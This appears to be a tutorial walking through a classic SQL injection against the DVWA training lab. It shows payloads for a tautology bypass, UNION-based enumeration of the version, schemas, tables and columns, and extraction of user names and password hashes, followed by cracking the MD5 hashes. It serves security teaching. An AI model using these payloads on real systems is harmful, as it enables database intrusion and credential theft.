---
title: SQL Injection
description: Learn how to exploit sql injection vulnerability.
author: Kalidou DIA
---

# <center>CLASSIQUE SQL INJECTION - EXPLOIT</center>

![alt text](/img/sql_classic/sql_injection.jpeg#center)

## 1. Presentation

### In this tutorial, we'll look at how to exploit an SQL injection vulnerability.

The website in question contains a lot of vulnerabilities. In a way, it is a laboratory for exploiting and testing vulnerabilities.
The vulnerability we are going to describe in the following lines is "SQL injection". More information :[ click here to view](https://www.kaspersky.fr/resource-center/definitions/sql-injection)
<p>The technologies used on this website are :</p>

![alt text](/img/sql_classic/techno_site.png#center)

Description of interaction with site visitors

-  1. We ask the visitor to enter a user id
-  2. The server then returns the "First name" and "Surname" of the corresponding id.
<br>

![alt text](/img/sql_classic/gordon_screen.png#center)


## 2. How the website works 

### 2.1 Let's see how the site behaves when you enter values it doesn't expect
<div style="display:flex; flex-direction:row; justify-content: center; align-items: start;">
    <div>
        <p>Enter a character string with quotes instead of an integer</p>
        <img src="/img/sql_classic/coucou.png"/>
    </div>
    <div>
        <p>The server processes the request correctly and returns a code 200 to say that everything is fine. Which is abnormal.</p>
        <img src="/img/sql_classic/coucou_response.png"/>
    </div>
</div>

### 2.2 Let's see if the sql injection works.
To do this, we're going to guess (thanks to the technology used on this site) the SQL query that is used to retrieve the information displayed.
After several tests, we deduce that the query in question could look like this:

```SQL
    SELECT colonne1, colonne2
    FROM nom_de_la_table 
    WHERE id = '$id';
```
The *id* field is our input that has been sent to the server. This is the field we're going to use to change the SQL query.

To do this, we're going to put in a character string that will return all the lines.
The string in question is as follows: 
`` ' OR 1=1 -- - ``
<p> As a result, the query will be : </p>

```SQL
    SELECT colonne1, colonne2
    FROM nom_de_la_table
    WHERE id = '' OR 1=1 -- - ' ;
```

<p> This query will return the rows of the table concerned because the condition 

`` WHERE id='' OR 1=1 `` 
is always true. The characters "<span style="color:#FF5733">-- -</span>" are used to comment out the rest of the request, which will not be executed.</p>

![alt text](/img/sql_classic/exploit1.png#center)

The SQL injection passes and the table information is displayed.


## 3. Extract more information

We are sure that the site is vulnerable to SQL injection.
Let's try to get some more information.

### 3.1 Database version

By running a few tests, we know that there are two columns being requested in the query.
<p>As a result, our input will take this value :

''`` ' UNION SELECT NULL,version()-- - ``''
</p>


The query will look like this: 
```SQL
    SELECT colonne1, colonne2
    FROM nom_de_la_table
    WHERE  id = '' UNION SELECT NULL,version()-- - '
```

``version()`` or ``@@version`` is a system variable found in most SQL databases.


![alt text](/img/sql_classic/version.png#center)
The image above shows that this is a mariaDB.

### 3.2 Database names (schemas)

Our input here will take the following value: ``' UNION SELECT concat(schema_name),1 from information_schema.schemata -- - ``


``schema_name `` is also a system variable. So the schematics will be displayed in the first column and the value 1 in the second
We can see from the screenshot below that we have 2 comics: **dvwa'** and **information_schema**.

The database of interest to us is dvwa

![alt text](/img/sql_classic/schema.png#center)

### 3.3 Extract tables from the dvwa DB

input  :  <span style = "color : #FF5733 ">
``' UNION SELECT concat(TABLE_NAME),1 from information_schema.TABLES WHERE table_schema='dvwa' -- -``
</span>

**TABLE_NAME** is also a system variable
We can see that the dvwa DB contains two tables: users and guestbook

![alt text](/img/sql_classic/tables.png#center)


### 3.4 Extract columns from users table

input  :  <span style = "color : #FF5733 ">
``' UNION SELECT concat(COLUMN_NAME),1 from information_schema.COLUMNS WHERE TABLE_NAME='users' -- -``
</span>

**COLUMN_NAME** is also a system variable
The users table columns are :
    <li>user_id</li>
    <li>first_name</li>
    <li>last_name</li>
    <li>user</li>
    <li>password</li>
    <li>avatar</li>
    <li>last_login</li>
    <li>failed_login</li>

![alt text](/img/sql_classic/columns.png#center)


### 3.5 Extract all names and passwords

input  :  <span style = "color : #FF5733 ">
``'  UNION SELECT concat(0x28,first_name,0x3a,last_name,0x3a,password,0x29),1 from users -- -``
</span>

We use the ``concat()`` function to format and display as much information as we want.
<p>The characters <span style="color: #E85320"> 0x28 0x3a 0x29 </span> are respectively the ASCII representations of <span style="color: #E85320;"> <i>(</i> </span>, <span style="color: #E85320;"> <i>:</i> </span>  and <span style="color: #E85320;"> <i>)</i> </span> converted to hexadecimal. They are used for formatting</p>

The image below shows the various items of information recovered.
![alt text](/img/sql_classic/lines.png#center)

## 4. Cracking passwords

Note that the passwords are hashed. The hash used looks like MD5 (32 characters).
<p>To crack passwords, let's use <a href="https://www.openwall.com/john/">John the Ripper</a> or an online password cracker : <a href="https://md5decrypt.net/">MD5 decrypt</a></p>

![alt text](/img/sql_classic/decrypt_password.png)

The unencrypted passwords are shown in the image above.
